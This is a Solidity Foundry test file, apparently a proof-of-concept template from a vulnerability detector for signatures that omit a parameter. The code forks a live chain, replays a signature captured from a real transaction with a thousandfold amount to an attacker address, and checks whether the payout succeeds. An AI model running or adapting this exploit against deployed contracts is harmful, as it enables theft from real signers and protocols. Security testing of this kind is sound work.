// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Signature that does not cover every parameter
/// @notice Detector: signature-field-omission. The digest omits a parameter
///         that steers value, so a replayer keeps a valid signature and changes
///         the uncovered field.
/// @dev FORK-ONLY. POC_TARGET is the contract, POC_SIG_DATA is a captured
///      (signer, amount, recipient, v, r, s) tuple from a real transaction —
///      copy it from the mempool or an explorer. Success is the SECOND call
///      with a changed amount still passing the signature check.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set (the contract)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_replayWithChangedField() public {
        // A captured authorisation: signer, honest amount, recipient, signature.
        address signer = vm.envOr("POC_SIGNER", address(0));
        address recipient = vm.envOr("POC_RECIPIENT", address(0));
        uint8 v = uint8(vm.envOr("POC_V", uint256(27)));
        bytes32 r = vm.envOr("POC_R", bytes32(0));
        bytes32 s = vm.envOr("POC_S", bytes32(0));
        uint256 honest = vm.envOr("POC_AMOUNT", uint256(1));

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        uint256 before = attacker.balance;

        // Same signature, an amount the digest never covered.
        string[4] memory entries = [
            "claim(address,uint256,address,uint8,bytes32,bytes32)",
            "redeem(address,uint256,address,uint8,bytes32,bytes32)",
            "withdraw(address,uint256,address,uint8,bytes32,bytes32)",
            "execute(address,uint256,address,uint8,bytes32,bytes32)"
        ];
        uint256 inflated = honest * 1_000;
        for (uint256 i = 0; i < entries.length; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(entries[i], signer, inflated, attacker, v, r, s));
            console.log("tried", entries[i], ok ? "returned" : "reverted");
        }

        assertTrue(
            attacker.balance > before,
            "no replayed signature paid out with an inflated amount. Tried claim/redeem/withdraw/execute with the captured signer, signature and 1000x the honest amount. This does NOT establish safety: the entry may be named differently, the captured signature may already be spent (a nonce), or the digest may cover the amount — which is the fix."
        );
    }
}
